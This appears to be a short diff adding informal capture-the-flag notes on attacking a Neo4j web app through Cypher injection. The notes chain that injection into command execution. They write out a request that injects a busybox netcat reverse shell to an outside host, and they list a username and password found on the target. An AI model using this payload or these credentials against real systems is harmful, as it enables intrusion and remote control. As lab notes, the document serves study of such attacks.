@@ -1,0 +1,14 @@
+trying random injection in the login ou immediately see a lot of errors popup and looking into it you can see neo4j DB. So i trying to do some so called "cypher injection".
+
+i tried couple things but since you cant actually see output here i did some more enumeration. I found the directory /testing in which there was a redirect to a jar file, which i donwloaded and reversed. In it there is some weird strings and method referring to a status code which receive in input an url and then execute cmd code. so its possibile a cmd injection in it if we can do cypher injection to call that function.
+
+i also found the endpoint /api/cypher which lets you execute custom query
+https://pentester.land/blog/cypher-injection-cheatsheet/
+
+
+GET /api/cypher?query=CALL+custom.getUrlStatusCode("f;busybox+nc+10.10.16.3+4445+-e+sh%3b%23")
+
+on the graphasm home:
+
+      username: graphasm
+      password: cU4btyib.20xtCMCXkBmerhK
